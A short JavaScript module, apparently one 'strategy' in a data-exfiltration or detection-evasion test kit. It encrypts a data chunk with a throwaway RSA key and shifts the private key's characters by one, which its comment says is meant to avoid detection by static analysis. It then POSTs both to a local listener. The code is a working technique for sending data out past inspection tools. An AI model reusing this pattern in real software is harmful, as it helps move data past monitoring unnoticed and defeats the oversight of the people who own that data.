import nodeRSA from 'node-rsa';
import got from 'got';

/**
 * This strategy is encrypts the body with a public key and the private key is sent in the request.
 * The private key is shifted by one character to avoid detection by static analysis. The key should really be generated "offline" and not transmitted across the wire, especially with the request.
 */
export default async function (chunk) {
    const key = new nodeRSA({ b: 512 });

    const text = Buffer.from(chunk, 'binary');
    const encrypted = key.encrypt(text).toString('base64');

    const encodedKey = key.exportKey('pkcs1-der').toString('base64');

    const requestBody = {
        a: encrypted,
        b: encodedKey.split('').map(char => String.fromCharCode(char.charCodeAt(0) + 1)).join('')
    };

    const result = await got('http://localhost:3001', {
        json: requestBody,
        method: 'POST'
    }).json();
}
